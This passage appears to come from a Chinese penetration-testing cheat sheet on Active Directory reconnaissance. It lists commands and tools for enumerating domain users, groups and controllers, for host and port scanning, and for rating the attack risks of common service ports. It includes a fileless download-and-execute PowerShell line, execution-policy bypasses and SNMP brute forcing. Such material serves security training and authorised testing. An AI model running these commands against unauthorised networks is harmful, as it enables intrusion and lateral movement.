<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">setspn <span class="literal">-Q</span> */*</span><br></pre></td></tr></table></figure>

<p>获取密码信息</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">net accounts /domain</span><br></pre></td></tr></table></figure>

<p>修改域用户的密码</p>
<p>需要域管理员权限</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">net user /domain xxx <span class="number">123456</span></span><br></pre></td></tr></table></figure>

<p>域信任信息</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">nltest /domain_trusts</span><br></pre></td></tr></table></figure>







<h3 id="查询域用户信息"><a href="#查询域用户信息" class="headerlink" title="查询域用户信息"></a>查询域用户信息</h3><p>查看所在域的所有用户</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">net user /domain</span><br></pre></td></tr></table></figure>

<p>查看域用户的详细信息</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">wmic useraccount get /all</span><br></pre></td></tr></table></figure>

<p>查看存在的用户</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">dsquery user</span><br></pre></td></tr></table></figure>

<p>其他常用dsquery命令</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">dsquery computer - 查找目录中的计算机</span><br><span class="line">dsquery contact - 查找目录中的联系人</span><br><span class="line">dsquery subnet - 查找目录中的子网</span><br><span class="line">dsquery <span class="built_in">group</span> - 查找目录中的组</span><br><span class="line">dsquery ou - 查找目录中的组织单位</span><br><span class="line">dsquery site - 查找目录中的站点</span><br><span class="line">dsquery server - 查找目录中的域控制器</span><br><span class="line">dsquery user - 查找目录中的用户</span><br><span class="line">dsquery quota - 查找目录中的配额</span><br><span class="line">dsquery partition - 查找目录中的分区</span><br><span class="line">dsquery * - 用通用的 LDAP 查询查找目录中的任何对象</span><br></pre></td></tr></table></figure>

<p>网络发现</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">net view 					查看同一域内用户列表</span><br><span class="line">net view \\ip				查看某IP的共享</span><br><span class="line">net view \\USER				查看USER计算机的共享</span><br><span class="line">net view \\domain			查看存在多少域</span><br><span class="line">net view \\domain:USER		查看USER域的用户</span><br><span class="line">net view /all</span><br></pre></td></tr></table></figure>

<p>查看某个域用户的详细信息</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">net user xxx /domain</span><br></pre></td></tr></table></figure>

<p>列出或断开网络上该计算机和其他计算机之间的会话</p>
<p>需要管理员权限</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">net session</span><br></pre></td></tr></table></figure>



<h3 id="查询域组的信息"><a href="#查询域组的信息" class="headerlink" title="查询域组的信息"></a>查询域组的信息</h3><p>查询域工作组</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">whoami /all</span><br><span class="line">net <span class="built_in">group</span> /domain</span><br><span class="line">net <span class="built_in">group</span> <span class="string">&quot;xxx&quot;</span> /domain</span><br></pre></td></tr></table></figure>

<p>查看域用户组信息</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">net <span class="built_in">group</span> <span class="string">&quot;Enterprise Admins&quot;</span> /domain</span><br></pre></td></tr></table></figure>

<p>查看域机器</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">net <span class="built_in">group</span> <span class="string">&quot;Domain Computers&quot;</span> /domain</span><br></pre></td></tr></table></figure>

<p>查询某个域组的详细信息和包含成员</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">net localgroup administrators</span><br><span class="line">net localgroup users</span><br></pre></td></tr></table></figure>

<p>查询登录本机的域管理员</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">net localgroup administrators /domain</span><br></pre></td></tr></table></figure>

<p>域用户添加到本机</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">net localgroup administrators workgroup\user /add</span><br></pre></td></tr></table></figure>



<h3 id="查询域控制器"><a href="#查询域控制器" class="headerlink" title="查询域控制器"></a>查询域控制器</h3><p>定位域控</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">net time /domain</span><br></pre></td></tr></table></figure>

<p>域控信息</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">nltest /dclist:xx</span><br><span class="line"><span class="built_in">Get-NetDomain</span></span><br><span class="line"><span class="built_in">Get-NetDomainController</span></span><br><span class="line">net <span class="built_in">group</span> <span class="string">&quot;Domain controllers&quot;</span> /domain</span><br></pre></td></tr></table></figure>

<p>查看域控制器主机名</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">nslookup <span class="literal">-type</span>=SRV _ldap._tcp</span><br><span class="line">netdom query pdc</span><br></pre></td></tr></table></figure>

<p>查看域控制器组</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">net <span class="built_in">group</span> <span class="string">&quot;Domain controllers&quot;</span> /domain</span><br></pre></td></tr></table></figure>

<p>查看域管理员</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">net <span class="built_in">group</span> <span class="string">&quot;Domain Admins&quot;</span> /domain</span><br></pre></td></tr></table></figure>



<h3 id="查询域内管理员信息"><a href="#查询域内管理员信息" class="headerlink" title="查询域内管理员信息"></a>查询域内管理员信息</h3><p>查询本地管理员组用户</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">net localgroup administrators</span><br></pre></td></tr></table></figure>

<p>查询域管理员组</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">net <span class="built_in">group</span> <span class="string">&quot;Enterprise Admins&quot;</span> /domain</span><br></pre></td></tr></table></figure>

<p>查询域管理员用户</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">net <span class="built_in">group</span> <span class="string">&quot;Domain Admins&quot;</span> /domain</span><br></pre></td></tr></table></figure>



<h3 id="域信息收集脚本"><a href="#域信息收集脚本" class="headerlink" title="域信息收集脚本"></a>域信息收集脚本</h3><h4 id="psloggedon-脚本"><a href="#psloggedon-脚本" class="headerlink" title="psloggedon 脚本"></a>psloggedon 脚本</h4><p><a href="https://docs.microsoft.com/en-us/sysinternals/downloads/psloggedon">https://docs.microsoft.com/en-us/sysinternals/downloads/psloggedon</a></p>
<p>在 Windows 上使用 <code>net session</code> 可以查看谁使用了本机资源，但不能查看谁在使用远程计算机资源、谁登录了本地或远程计算机，使用 psloggedon 可以查看本地登录的用户和通过本地计算机或远程计算机进行资源登录的用户</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">PsLoggedon.exe <span class="literal">-l</span> \\<span class="number">192.168</span>.<span class="number">1.1</span></span><br></pre></td></tr></table></figure>



<h4 id="PVEFindADUser-脚本"><a href="#PVEFindADUser-脚本" class="headerlink" title="PVEFindADUser 脚本"></a>PVEFindADUser 脚本</h4><p><a href="https://github.com/chrisdee/Tools/tree/master/AD/ADFindUsersLoggedOn">https://github.com/chrisdee/Tools/tree/master/AD/ADFindUsersLoggedOn</a></p>
<p>PVEFindADUser 用于查找活动目录用户登录的位置、枚举域用户，以及查找在特定计算机上登录的用户，包括本地用户、通过 RDP 登录的用户、用于运行服务器和计划任务的用户，该工具需要管理员权限</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">PVEFindADUser.exe <span class="literal">-current</span></span><br></pre></td></tr></table></figure>



<h4 id="netview-脚本"><a href="#netview-脚本" class="headerlink" title="netview 脚本"></a>netview 脚本</h4><p><a href="https://github.com/mubix/netview">https://github.com/mubix/netview</a></p>
<p>netview 是一个枚举工具，使用 WinAPI 枚举系统，利用 NetSessionEnum 寻找登录会话，利用 NetShareEnum 寻找共享，利用 NetWkstaUserEnum 枚举登录的用户，netview 可以查询共享入口和有价值的用户，其绝大部分功能无需管理员权限就可使用</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">netview.exe <span class="literal">-d</span></span><br></pre></td></tr></table></figure>



<h4 id="NSE-脚本"><a href="#NSE-脚本" class="headerlink" title="NSE 脚本"></a>NSE 脚本</h4><p><a href="https://nmap.org/nsedoc/scripts/">https://nmap.org/nsedoc/scripts/</a></p>
<p>常用的 NSE 脚本如下：</p>
<p><code>smb-enum-domains.nse</code>:对域控制器进行信息收集，可以获取主机信息、用户、可使用密码策略的用户等</p>
<p><code>smb-enum-users.nse</code>:在进行域渗透时，如获取了域内某台主机权限，但权限有限，无法获取更多的域用户信息，可借助此脚本对域控制器进行扫描</p>
<p><code>smb-enum-shares.nse</code>:遍历远程主机的共享目录</p>
<p><code>smb-enum-processes.nse</code>:对主机的系统进程进行遍历，通过此信息，可知道目标主机运行着哪些软件</p>
<p><code>smb-enum-sessions.nse</code>:获取域内主机的用户登陆会话，查看当前是否有用户登陆，且不需要管理员权限</p>
<p><code>smb-os-discovery.nse</code>:收集目标主机的操作系统、计算机名、域名、域林名称、NetBIOS机器名、NetBIOS域名、工作组、系统时间等信息</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">nmap -<span class="literal">-script</span>=smb<span class="literal">-os</span><span class="literal">-discovery</span>.nse <span class="literal">-p</span> <span class="number">445</span> <span class="number">192.168</span>.<span class="number">1.1</span></span><br></pre></td></tr></table></figure>



<h4 id="PowerView-脚本"><a href="#PowerView-脚本" class="headerlink" title="PowerView 脚本"></a>PowerView 脚本</h4><p><a href="https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerView">https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerView</a></p>
<p>PowerView 脚本中包含了一系列的 powershell 脚本，信息收集相关的脚本有 Invoke-StealthUserHunter、Invoke-UserHunter 等，要使用 PowerView 脚本需要将 PowerView 文件夹复制到 PowerShell 的 Module 文件夹内， Module 文件夹路径可以通过在 PowerShell 中输入<code>$Env:PSModulePath</code>查看</p>
<p>接着在 powershell中输入<code>Import-Module PowerView</code>即可导入PowerView，使用<code>Get-Command -Module PowerView</code>可查看已导入的 PowerView 命令</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Invoke-StealthUserHunter</span>		获取域里面的所有用户</span><br><span class="line"><span class="built_in">Invoke-UserHunter</span>				找到域内特定的用户群，接受用户名、用户列表和域组查询</span><br><span class="line"><span class="built_in">Get-NetDomain</span>					获取当前用户所在域名称</span><br><span class="line"><span class="built_in">Get-NetUser</span>						获取所有用户的详细信息</span><br><span class="line"><span class="built_in">Get-NetDomainController</span>			获取所有域控制器的信息</span><br><span class="line"><span class="built_in">Get-NetComputer</span>					获取域内所有机器的详细信息</span><br><span class="line"><span class="built_in">Get-NetOU</span>						获取域中的OU信息</span><br><span class="line"><span class="built_in">Get-NetGroup</span>					获取所有域内组和组成员信息</span><br><span class="line"><span class="built_in">Get-NetFileServer</span>				根据SPN获取当前域使用的文件服务器信息</span><br><span class="line"><span class="built_in">Get-NetShare</span>					获取当前域内所有的网络共享信息</span><br><span class="line"><span class="built_in">Get-NetSession</span>					获取指定服务器的会话</span><br><span class="line"><span class="built_in">Get-NetRDPSession</span>				获取指定服务器的远程连接</span><br><span class="line"><span class="built_in">Get-NetProcess</span>					获取远程主机的进程</span><br><span class="line"><span class="built_in">Get-UserEvent</span>					获取指定用户的日志</span><br><span class="line"><span class="built_in">Get-ADObject</span>					获取活动目录的对象</span><br><span class="line"><span class="built_in">Get-NetGPO</span>						获取域内所有组的策略对象</span><br><span class="line"><span class="built_in">Get-DomainPolicy</span>				取域默认策略或域控制器策略</span><br><span class="line"><span class="built_in">Invoke-UserHunter</span>				获取域用户登陆的计算机信息及该用户是否有本地管理员权限</span><br><span class="line"><span class="built_in">Invoke-ProcessHunter</span>			通过查询域内所有的机器进程找到特定用户</span><br><span class="line"><span class="built_in">Invoke-UserEventHunter</span>			根据用户日志查询某域用户登陆过哪些域机器</span><br></pre></td></tr></table></figure>



<h3 id="域内存活主机探测"><a href="#域内存活主机探测" class="headerlink" title="域内存活主机探测"></a>域内存活主机探测</h3><h4 id="通过ICMP协议"><a href="#通过ICMP协议" class="headerlink" title="通过ICMP协议"></a>通过ICMP协议</h4><p><strong>CMD扫描</strong></p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># windows</span></span><br><span class="line"><span class="keyword">for</span> /L %I <span class="keyword">in</span> (<span class="number">1</span>,<span class="number">1</span>,<span class="number">254</span>) <span class="keyword">Do</span> @ping <span class="literal">-w</span> <span class="number">1</span> <span class="literal">-n</span> <span class="number">1</span> <span class="number">192.168</span>.<span class="number">1</span>.%I | findstr <span class="string">&quot;TTL=&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># linux</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="variable">$</span>( seq <span class="number">1</span> <span class="number">255</span>);<span class="keyword">do</span> ping <span class="literal">-c</span> <span class="number">1</span> <span class="number">192.168</span>.<span class="number">1</span>.<span class="variable">$k</span>|grep <span class="string">&quot;ttl&quot;</span>|awk <span class="operator">-F</span> <span class="string">&quot;[ :]+&quot;</span> <span class="string">&#x27;&#123;print $4&#125;&#x27;</span>; done </span><br></pre></td></tr></table></figure>

<p><strong>nmap扫描</strong></p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">nmap <span class="literal">-sn</span> <span class="literal">-PE</span> <span class="literal">-T4</span> <span class="number">192.168</span>.<span class="number">1.0</span>/<span class="number">24</span></span><br><span class="line">nmap ‐<span class="built_in">sP</span> ‐PI ‐T4 <span class="number">192.168</span>.<span class="number">1.0</span>/<span class="number">24</span></span><br></pre></td></tr></table></figure>

<p><strong>powershell扫描</strong></p>
<p><a href="https://github.com/sirrushoo/Powershell-Tools/blob/master/Invoke-TSPingSweep.ps1">https://github.com/sirrushoo/Powershell-Tools/blob/master/Invoke-TSPingSweep.ps1</a></p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">powershell.exe ‐exec bypass ‐Command <span class="string">&quot;Import‐Module ./Invoke‐TSPingSweep.ps1; Invoke‐TSPingSweep ‐StartAddress 192.168.1.1 ‐EndAddress 192.168.1.254 ‐ResolveHost ‐ScanPort ‐Port 445,135&quot;</span></span><br></pre></td></tr></table></figure>

<p><strong>cping扫描</strong></p>
<p><a href="http://www.naughter.com/ping.html">http://www.naughter.com/ping.html</a></p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">cping.exe <span class="number">192.168</span>.<span class="number">1.1</span></span><br></pre></td></tr></table></figure>



<h4 id="通过ARP协议"><a href="#通过ARP协议" class="headerlink" title="通过ARP协议"></a>通过ARP协议</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">arp <span class="literal">-a</span></span><br></pre></td></tr></table></figure>

<p><strong>nmap扫描</strong></p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">nmap <span class="literal">-sn</span> <span class="literal">-PR</span> <span class="number">192.168</span>.<span class="number">1.1</span>/<span class="number">24</span></span><br></pre></td></tr></table></figure>



<p><strong>arp-scan</strong></p>
<p><a href="https://github.com/QbsuranAlang/arp-scan-windows-/tree/master/arpscan">https://github.com/QbsuranAlang/arp-scan-windows-/tree/master/arpscan</a></p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">arp<span class="literal">-scan</span>.exe <span class="literal">-t</span> <span class="number">192.168</span>.<span class="number">1.1</span>/<span class="number">24</span></span><br></pre></td></tr></table></figure>



<p><strong>arp scannet</strong></p>
<p><a href="https://sourceforge.net/projects/arpscannet/files/latest/download">https://sourceforge.net/projects/arpscannet/files/latest/download</a></p>
<p><strong>arp-ping</strong></p>
<p><a href="https://elifulkerson.com/projects/arp-ping.php">https://elifulkerson.com/projects/arp-ping.php</a></p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">arp<span class="literal">-ping</span>.exe <span class="number">192.168</span>.<span class="number">1.100</span></span><br></pre></td></tr></table></figure>



<p><strong>powershell</strong></p>
<p>Nishang中的Invoke-ARPScan.ps1</p>
<p><a href="https://github.com/EmpireProject/Empire/blob/master/data/module_source/situational_awareness/network/Invoke-ARPScan.ps1">https://github.com/EmpireProject/Empire/blob/master/data/module_source/situational_awareness/network/Invoke-ARPScan.ps1</a></p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">c:\tmp&gt;powershell.exe <span class="literal">-exec</span> bypass <span class="literal">-Command</span> <span class="string">&quot;Import-Module .\arpscan.ps1;InvokeARPScan -CIDR 192.168.1.0/24&quot;</span></span><br></pre></td></tr></table></figure>



<p><strong>msf</strong></p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">use auxiliary/scanner/discovery/arp_sweep</span><br></pre></td></tr></table></figure>



<h4 id="通过-Netbios-协议"><a href="#通过-Netbios-协议" class="headerlink" title="通过 Netbios 协议"></a>通过 Netbios 协议</h4><p><strong>nbtscan工具</strong></p>
<p><a href="http://www.unixwiz.net/tools/nbtscan.html">http://www.unixwiz.net/tools/nbtscan.html</a></p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">nbtscan.exe <span class="literal">-m</span> <span class="number">192.168</span>.<span class="number">0.1</span>/<span class="number">24</span></span><br></pre></td></tr></table></figure>



<p><strong>nmap工具</strong></p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">nmap <span class="literal">-sU</span> -<span class="literal">-script</span> nbstat.nse <span class="literal">-p</span> <span class="number">137</span> <span class="number">192.168</span>.<span class="number">1.0</span>/<span class="number">24</span> <span class="literal">-T4</span></span><br></pre></td></tr></table></figure>



<p><strong>NetBScanner</strong></p>
<p><a href="https://www.nirsoft.net/utils/netbios_scanner.html">https://www.nirsoft.net/utils/netbios_scanner.html</a></p>
<p><strong>msf</strong></p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">use auxiliary/scanner/netbios/nbname</span><br></pre></td></tr></table></figure>



<h4 id="通过-UDP-协议"><a href="#通过-UDP-协议" class="headerlink" title="通过 UDP 协议"></a>通过 UDP 协议</h4><p><strong>nmap</strong></p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">nmap <span class="literal">-sU</span> <span class="literal">-T5</span> <span class="literal">-sV</span> -<span class="literal">-max</span><span class="literal">-retries</span> <span class="number">1</span> <span class="number">192.168</span>.<span class="number">2.4</span> <span class="literal">-p</span> <span class="number">500</span></span><br></pre></td></tr></table></figure>



<p><strong>ScanLine</strong></p>
<p><a href="http://www.ddooo.com/softdown/11258.htm">http://www.ddooo.com/softdown/11258.htm</a></p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">ScanLine.exe <span class="literal">-bht</span> <span class="number">1</span><span class="literal">-65535</span> <span class="number">192.168</span>.<span class="number">1.0</span>/<span class="number">24</span></span><br><span class="line">ScanLine.exe <span class="literal">-u</span> <span class="number">53</span> <span class="number">192.168</span>.<span class="number">1.0</span><span class="literal">-255</span></span><br></pre></td></tr></table></figure>



<p><strong>msf</strong></p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">use auxiliary/scanner/discovery/udp_probe</span><br><span class="line">use auxiliary/scanner/discovery/udp_sweep</span><br></pre></td></tr></table></figure>



<h4 id="通过-SNMP-协议"><a href="#通过-SNMP-协议" class="headerlink" title="通过 SNMP 协议"></a>通过 SNMP 协议</h4><p><strong>nmap</strong></p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">root@John:~<span class="comment"># nmap -sU --script snmp-brute 192.168.1.0/24 -T4</span></span><br></pre></td></tr></table></figure>



<h4 id="通过SMB协议"><a href="#通过SMB协议" class="headerlink" title="通过SMB协议"></a>通过SMB协议</h4><p><strong>nmap</strong></p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">nmap <span class="literal">-sU</span> -<span class="literal">-script</span> snmp<span class="literal">-brute</span> <span class="number">192.168</span>.<span class="number">1.1</span>/<span class="number">24</span> <span class="literal">-T4</span></span><br><span class="line">nmap ‐sU ‐sS ‐‐script smb‐<span class="class"><span class="keyword">enum</span>‐<span class="title">shares</span>.<span class="title">nse</span> ‐<span class="title">p</span> 445 192.168.1.119</span></span><br></pre></td></tr></table></figure>



<p><strong>msf</strong></p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">use auxiliary/scanner/snmp/snmp_enum</span><br></pre></td></tr></table></figure>



<p><strong>通过CMD</strong></p>
<p>会打开 254 个 telnet 页面，连接 192.168.2.1 到 192.168.2.254 的 445 端口，如果有主机的 445 端口能连接上，则会留下来，其他的会全部自动关闭掉</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> /l %a <span class="keyword">in</span> (<span class="number">1</span>,<span class="number">1</span>,<span class="number">254</span>) <span class="keyword">do</span> <span class="built_in">start</span> /min /low telnet <span class="number">192.168</span>.<span class="number">2</span>.%a <span class="number">445</span></span><br></pre></td></tr></table></figure>



<p><strong>通过NC</strong></p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">nc <span class="literal">-v</span> <span class="number">192.168</span>.<span class="number">1.100</span> <span class="number">445</span></span><br><span class="line"></span><br><span class="line"><span class="function">[<span class="number">192.168</span><span class="type">.1.100</span>] 445 (<span class="title">microsoft</span></span><span class="literal">-ds</span>) open</span><br></pre></td></tr></table></figure>



<h3 id="域内端口扫描"><a href="#域内端口扫描" class="headerlink" title="域内端口扫描"></a>域内端口扫描</h3><p><strong>使用powershell</strong></p>
<p>探测单个IP的1-1024的端口</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>..<span class="number">1024</span> | % &#123;<span class="built_in">echo</span> ((<span class="built_in">new-object</span> Net.Sockets.TcpClient).Connect(<span class="string">&quot;127.0.0.1&quot;</span>,<span class="variable">$_</span>)) <span class="string">&quot;Port <span class="variable">$_</span> is open!&quot;</span>&#125; <span class="number">2</span>&gt;<span class="variable">$null</span></span><br></pre></td></tr></table></figure>

<p>探测网段的80端口</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="keyword">foreach</span> (<span class="variable">$ip</span> <span class="keyword">in</span> <span class="number">1</span>..<span class="number">255</span>) &#123;<span class="built_in">Test-NetConnection</span> <span class="literal">-Port</span> <span class="number">80</span> <span class="literal">-InformationLevel</span> <span class="string">&quot;Detailed&quot;</span> <span class="number">192.168</span>.<span class="number">1</span>.<span class="variable">$ip</span>&#125;</span><br></pre></td></tr></table></figure>

<p>探测多个IP的多个端口</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>..<span class="number">255</span> | % &#123; <span class="variable">$a</span> = <span class="variable">$_</span>; <span class="number">1</span>..<span class="number">65535</span> | % &#123;<span class="built_in">echo</span> ((<span class="built_in">new-object</span> Net.Sockets.TcpClient).Connect(<span class="string">&quot;192.168.1.<span class="variable">$a</span>&quot;</span>,<span class="variable">$_</span>)) <span class="string">&quot;192.168.1.<span class="variable">$a</span> Port <span class="variable">$_</span> is open!&quot;</span>&#125; <span class="number">2</span>&gt;<span class="variable">$null</span>&#125;</span><br></pre></td></tr></table></figure>

<p><strong>tcping扫描</strong></p>
<p><a href="https://elifulkerson.com/projects/tcping.php">https://elifulkerson.com/projects/tcping.php</a></p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">tcping <span class="literal">-n</span> <span class="number">1</span> <span class="number">192.168</span>.<span class="number">1.1</span> <span class="number">80</span></span><br></pre></td></tr></table></figure>

<p><strong>PowerSploit 的Invoke-portscan.ps1脚本</strong></p>
<p>无文件的形式</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">powershell <span class="literal">-nop</span> <span class="literal">-exec</span> bypass <span class="literal">-c</span> <span class="string">&quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/Invoke-Portscan.ps1&#x27;);Invoke-Portscan -Hosts 192.168.1.0/24 -T 4 -ports &#x27;445,1433,8080,3389,80&#x27; -oA C:\Windows\temp\res.txt&quot;</span></span><br></pre></td></tr></table></figure>

<p><strong>Nishang的Invoke-Portscan模块</strong></p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">- StartAddress：起始地址</span><br><span class="line">- EndAddress：结束地址</span><br><span class="line">- ScanPort：进行端口扫描</span><br><span class="line">- Port：指定扫描端口</span><br><span class="line">- ResolveHost 解析主机名</span><br><span class="line">- Timeout：设置超时时间</span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Invoke-PortScan</span> <span class="literal">-StartAddress</span> <span class="number">192.168</span>.<span class="number">1.1</span> <span class="literal">-EndAddress</span> <span class="number">192.168</span>.<span class="number">1.254</span> <span class="literal">-ResolveHost</span> <span class="literal">-ScanPort</span> <span class="literal">-Port</span> <span class="number">80</span></span><br></pre></td></tr></table></figure>

<p><strong>msf</strong></p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">use auxiliary/scanner/portscan/tcp</span><br></pre></td></tr></table></figure>



<h2 id="端口-Banner-信息表"><a href="#端口-Banner-信息表" class="headerlink" title="端口 Banner 信息表"></a>端口 Banner 信息表</h2><h3 id="文件共享服务端口"><a href="#文件共享服务端口" class="headerlink" title="文件共享服务端口"></a>文件共享服务端口</h3><table>
<thead>
<tr>
<th align="center">端口号</th>
<th align="center">说明</th>
<th align="center">风险</th>
</tr>
</thead>
<tbody><tr>
<td align="center">21</td>
<td align="center">FTP</td>
<td align="center">允许匿名的上传、下载爆破和嗅探操作</td>
</tr>
<tr>
<td align="center">69</td>
<td align="center">TFTP</td>
<td align="center">允许匿名的上传、下载爆破和嗅探操作</td>
</tr>
<tr>
<td align="center">139</td>
<td align="center">SAMBA 服务</td>
<td align="center">爆破、未授权访问、远程代码执行</td>
</tr>
<tr>
<td align="center">389</td>
<td align="center">LDAP 目录访问协议</td>
<td align="center">注入、允许匿名访问、弱口令</td>
</tr>
<tr>
<td align="center">2049</td>
<td align="center">NFS 服务</td>
<td align="center">配置不当</td>
</tr>
</tbody></table>
<h3 id="远程连接服务端口"><a href="#远程连接服务端口" class="headerlink" title="远程连接服务端口"></a>远程连接服务端口</h3><table>
<thead>
<tr>
<th align="center">端口号</th>
<th align="center">说明</th>
<th align="center">风险</th>
</tr>
</thead>
<tbody><tr>
<td align="center">22</td>
<td align="center">SSH 远程连接</td>
<td align="center">爆破、SSH隧道及内网代理转发、文件传输</td>
</tr>
<tr>
<td align="center">23</td>
<td align="center">Telnet 远程连接</td>
<td align="center">爆破、嗅探、弱口令</td>
</tr>
<tr>
<td align="center">80、443、8080</td>
<td align="center">Web 服务端口</td>
<td align="center">Web攻击、爆破、对应服务器版本漏洞</td>
</tr>
<tr>
<td align="center">1352</td>
<td align="center">Lotus Domino 邮件服务</td>
<td align="center">弱口令、信息泄露、爆破</td>
</tr>
<tr>
<td align="center">3389</td>
<td align="center">RDP 远程桌面连接</td>
<td align="center">Shift后门（Windows Server 2003以下版本）、爆破</td>
</tr>
<tr>
<td align="center">4848</td>
<td align="center">GlassFish 控制台</td>
<td align="center">弱口令</td>
</tr>
<tr>
<td align="center">5632</td>
<td align="center">PcAnywhere 服务</td>
<td align="center">抓取密码、代码执行</td>
</tr>
<tr>
<td align="center">5900</td>
<td align="center">VNC</td>
<td align="center">弱口令爆破</td>
</tr>
<tr>
<td align="center">7001、7002</td>
<td align="center">Weblogic控制台</td>
<td align="center">Java反序列化、弱口令</td>
</tr>
<tr>
<td align="center">8080、8089</td>
<td align="center">JBoss/Resin/Jetty/Jenkins</td>
<td align="center">反序列化、控制台弱口令</td>
</tr>
<tr>
<td align="center">9090</td>
<td align="center">WebSphere控制台</td>
<td align="center">Java反序列化、弱口令</td>
</tr>
<tr>
<td align="center">10000</td>
<td align="center">webmin控制面板</td>
<td align="center">弱口令</td>
</tr>
</tbody></table>
<h3 id="数据库服务端口"><a href="#数据库服务端口" class="headerlink" title="数据库服务端口"></a>数据库服务端口</h3><table>
<thead>
<tr>
<th align="center">端口号</th>
<th align="center">说明</th>
<th align="center">风险</th>
</tr>
</thead>
<tbody><tr>
<td align="center">1433</td>
<td align="center">MSSQL数据库</td>
<td align="center">注入、提权、SA弱口令、爆破</td>
</tr>
<tr>
<td align="center">1521</td>
<td align="center">Oracle数据库</td>
<td align="center">TNS爆破、注入、反弹Shell</td>
</tr>
<tr>
<td align="center">3306</td>
<td align="center">MySQL数据库</td>
<td align="center">注入、提权、爆破</td>
</tr>
<tr>
<td align="center">5000</td>
<td align="center">Sysbase/DB2数据库</td>
<td align="center">爆破、注入</td>
</tr>
<tr>
<td align="center">5432</td>
<td align="center">PostgreSQL数据库</td>
<td align="center">爆破、注入、弱口令</td>
</tr>
<tr>
<td align="center">6379</td>
<td align="center">Redis数据库</td>
<td align="center">未授权访问、弱口令</td>
</tr>
<tr>
<td align="center">27017、27018</td>
<td align="center">MongoDB数据库</td>
<td align="center">爆破、未授权访问</td>
</tr>
</tbody></table>
<h3 id="邮件服务端口"><a href="#邮件服务端口" class="headerlink" title="邮件服务端口"></a>邮件服务端口</h3><table>
<thead>
<tr>
<th align="center">端口号</th>
<th align="center">说明</th>
<th align="center">风险</th>
</tr>
</thead>
<tbody><tr>
<td align="center">25</td>
<td align="center">SMTP邮件服务</td>
<td align="center">邮件伪造</td>
</tr>
<tr>
<td align="center">110</td>
<td align="center">POP3协议</td>
<td align="center">爆破、嗅探</td>
</tr>
<tr>
<td align="center">143</td>
<td align="center">IMAP协议</td>
<td align="center">爆破</td>
</tr>
</tbody></table>
<h3 id="网络常见协议端口"><a href="#网络常见协议端口" class="headerlink" title="网络常见协议端口"></a>网络常见协议端口</h3><table>
<thead>
<tr>
<th align="center">端口号</th>
<th align="center">说明</th>
<th align="center">风险</th>
</tr>
